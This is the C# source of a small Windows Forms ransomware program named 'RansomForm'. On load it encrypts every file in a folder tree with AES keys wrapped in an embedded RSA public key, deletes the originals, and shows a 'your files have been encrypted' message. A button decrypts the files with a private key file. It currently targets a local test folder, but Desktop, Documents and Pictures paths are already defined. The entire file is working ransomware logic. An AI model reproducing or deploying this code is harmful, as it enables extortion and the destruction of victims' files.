using System.Security.Cryptography;
using System.IO;
using System.Reflection;
using System.Text;

namespace RansomForm
{
  public partial class Form1 : Form
  {
    private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
    private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
    private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

    private static int encryptedFileCount = 0;
    private static int decryptedFileCount = 0;

    private const string ENCRYPTED_FILE_EXTENSION = ".encrypted";

    private static string ENCRYPTION_LOG = "";
    private static string DECRYPTION_LOG = "";

    private byte[] privateKey;
    private byte[] publicKey;

    RSACryptoServiceProvider RSA;


    public Form1()
    {
      InitializeComponent();
    }

  private void Form1_Load(object sender, EventArgs e)
  {
    beginEncryption();
    formatFormPostEncryption();
  }

    private void beginEncryption()
    {
      publicKey = Properties.Resources.publickey;
      string folderpath = Directory.GetCurrentDirectory() + "\\test";
      RSA = new RSACryptoServiceProvider(2048);
      int bytesRead;
      RSA.ImportRSAPublicKey(publicKey, out bytesRead);
      encryptFolder(folderpath);
    }

	private void encryptFolder(string path)
    {
      foreach (string f in Directory.GetFiles(path))
      {
        if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
        {
          Console.Out.WriteLine("Encrypting: " + f);
          encryptFile(f, RSA);
        }
      }
      foreach (string f in Directory.GetDirectories(path))
      {
        encryptFolder(f);
      }
    }

    void encryptFile(string path, RSACryptoServiceProvider RSA)
    {
      try
      {
        using (FileStream fileStream = new(path, FileMode.Open))
        {
          using (Aes aes = Aes.Create())
          {
            byte[] keyvalue = new byte[32];
            byte[] iv = new byte[16];

            byte[] encryptedIv = new byte[256];
            byte[] encryptedAesKey = new byte[256];

            aes.Padding = PaddingMode.PKCS7;

            iv = aes.IV;
            keyvalue = aes.Key;

            encryptedAesKey = RSA.Encrypt(keyvalue, false); // size 256
            encryptedIv = RSA.Encrypt(iv, false); // size 256

            using (FileStream output = new(path + ENCRYPTED_FILE_EXTENSION, FileMode.Create))
            {
              output.Write(encryptedAesKey, 0, encryptedAesKey.Length);
              output.Write(encryptedIv, 0, encryptedIv.Length);

              using (CryptoStream cryptoStream = new(
                output,
                aes.CreateEncryptor(),
                CryptoStreamMode.Write))
              {

                byte[] buffer = new byte[1024];
                var read = fileStream.Read(buffer, 0, buffer.Length);
                while (read > 0)
                {
                  cryptoStream.Write(buffer, 0, read);
                  read = fileStream.Read(buffer, 0, buffer.Length);
                }
                cryptoStream.FlushFinalBlock();
              }
            }
          }
        }
        Console.WriteLine("The file was encrypted.");
        File.Delete(path);
      }
      catch (Exception ex)
      {
        Console.WriteLine($"The encryption failed. {ex}");
      }
      finally
      {
        encryptedFileCount++;
        ENCRYPTION_LOG += encryptedFileCount + ". " + path + Environment.NewLine;//+ "\n" + Environment.NewLine;
      }
    }
    private void formatFormPostEncryption()
    {
      this.Opacity = 100;
      lblCount.Text = "Your files (count: " + encryptedFileCount + ") have been encrypted!";
      textBox1.AppendText(ENCRYPTION_LOG);
    }

    private void buttonDecrypt_Click(object sender, EventArgs e) // 5
    {
      string folderpath = Directory.GetCurrentDirectory() + "\\test";
      using (FileStream fileStream = new("privatekey.pem", FileMode.Open))
      {
        privateKey = new byte[fileStream.Length];
        fileStream.Read(privateKey, 0, privateKey.Length);
      }
      decryptFolder(folderpath);
      this.Close();
    }

    void decryptFolder(string path)
    {
      RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
      int bytesRead;
      RSA.ImportPkcs8PrivateKey(privateKey, out bytesRead);

      foreach (string f in Directory.GetFiles(path))
      {
        if (f.Contains(ENCRYPTED_FILE_EXTENSION))
        {
          Console.Out.WriteLine("Decrypting: " + f);
          decryptFile(f, RSA);
        }
      }
      foreach (string f in Directory.GetDirectories(path))
      {
        decryptFolder(f);
      }
    }

    void decryptFile(string path, RSACryptoServiceProvider RSA)
    {
      try
      {
        using (FileStream fileStream = new(path, FileMode.Open))
        {
          using (Aes aes = Aes.Create())
          {
            byte[] decryptedIv = new byte[16];
            byte[] decryptedAesKey = new byte[32];

            byte[] encryptedIv = new byte[256];
            byte[] encryptedAesKey = new byte[256];

            fileStream.Read(encryptedAesKey, 0, 256); // Increases filestream position
            fileStream.Read(encryptedIv, 0, 256);

            decryptedAesKey = RSA.Decrypt(encryptedAesKey, false);
            decryptedIv = RSA.Decrypt(encryptedIv, false);
            
            aes.Key = decryptedAesKey; // length of 256
            aes.IV = decryptedIv;
            aes.Padding = PaddingMode.PKCS7;

            string newpath = path.Replace(ENCRYPTED_FILE_EXTENSION, "");

            using (FileStream output = new(newpath, FileMode.Create))
            {
              using (CryptoStream cryptoStream = new(
                output,
                aes.CreateDecryptor(),
                CryptoStreamMode.Write))
              {
                byte[] buffer = new byte[1024];
                var read = fileStream.Read(buffer, 0, buffer.Length);
                while (read > 0)
                {
                  cryptoStream.Write(buffer, 0, read);
                  read = fileStream.Read(buffer, 0, buffer.Length);
                }
                cryptoStream.FlushFinalBlock();
              }
            }
          }
        }
        Console.WriteLine("The file was decrypted.");
        File.Delete(path);
      }
      catch (Exception ex)
      {
        Console.WriteLine($"The decryption failed. {ex}");
      }
      finally
      {
        DECRYPTION_LOG += path + Environment.NewLine;
        decryptedFileCount++;
      }
    }
  }
}
